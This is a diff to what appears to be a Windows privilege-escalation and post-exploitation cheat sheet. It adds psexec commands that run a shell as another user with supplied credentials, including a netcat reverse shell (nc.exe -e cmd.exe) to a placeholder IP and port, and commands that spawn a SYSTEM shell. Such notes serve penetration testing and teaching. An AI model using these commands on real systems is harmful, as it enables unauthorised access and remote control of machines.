@@ -487,6 +487,17 @@ meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
 
 *LonelyPottato (RottenPotato w/o Metasploit)*
 
+###### Use credentials
+
+To use another user credentials, psexec can be used to start a cmd shell or start a
+reverse shell:
+
+```
+# Use the -s option if the user provided is member of the administrators group
+psexec.exe -s -i -d -u <DOMAIN/LOCAL>\<USERNAME> -p <PASSWORD>
+psexec.exe -s -d -u <DOMAIN/LOCAL>\<USERNAME> -p <PASSWORD> <FULLPATH/nc.exe> -e cmd.exe <IP> <PORT>
+```
+
 ### Post-Exploit
 
 #### Administrator to SYSTEM
@@ -508,7 +519,7 @@ an administrator account:
 # -i   Run the program so that it interacts with the desktop of the specified session on the remote system
 # -d   Don't wait for process to terminate (non-interactive).
 
-psexec.exe -s -i -d cmd.exe
+psexec.exe -accepteula -s -i -d cmd.exe
 ```
 
 If a meterpreter is being used, the **getsystem** command can be leveraged to achieve the same end.
